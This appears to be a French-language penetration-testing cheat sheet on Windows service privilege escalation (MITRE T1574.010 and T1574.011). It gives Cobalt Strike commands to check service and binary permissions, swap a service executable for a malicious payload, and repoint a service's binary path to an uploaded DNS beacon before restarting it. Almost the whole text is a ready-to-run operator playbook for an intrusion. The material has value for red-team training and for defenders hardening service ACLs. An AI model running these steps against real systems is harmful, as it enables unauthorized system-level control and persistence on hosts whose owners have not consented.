

# Service File Permissions (T1574.010)

Exploiter les mauvaises permissions sur le binaire afin de le remplacer.

## Cobalt Strike

Infos sur le service.

```
sc_query BadWindowsService
```

Identifier s'il est possible d'arrêter le service (nécessaire pour modifier le binaire)

```
sc_stop BadWindowsService
```

Identifier les permissions sur le binaire et s'il est possible d'écrire

```
cacls "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe"
```

Stopper le service associé au binaire si possible

```
sc_stop BadWindowsService
```

Renommer le binaire avant de le remplacer afin de ne pas l'écraser si possible (si non possible, envisager de copier le binaire original ailleurs, le télécharger ?).

```
cd C:\Program Files\Bad Windows Service\Service Executable\
mv BadWindowsService.exe BadWindowsService.exe.old
```

Remplacer le binaire

```
upload C:\Payloads\BadWindowsService.exe
```

Lancer le service

```
sc_start BadWindowsService
```


# Service Registry Permissions (T1574.011)


## Cobalt Strike
 
1. Identifier les droits d'un user sur un service dans le registre

```
powershell Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService | fl
```

2. Stopper le service

```
sc_stop BadWindowsService
```

3. Upload notre exe malveillant

```
cd C:\Temp
upload C:\Payloads\dns_x64.svc.exe
```

4. Changer le binpath du service

```
sc_config BadWindowsService C:\Temp\dns_x64.svc.exe 0 2
```

Alternative avec la création d'une clé *Performance* -> https://itm4n.github.io/windows-registry-rpceptmapper-eop/

4. Redémarrer le service

```
sc_start BadWindowsService
```

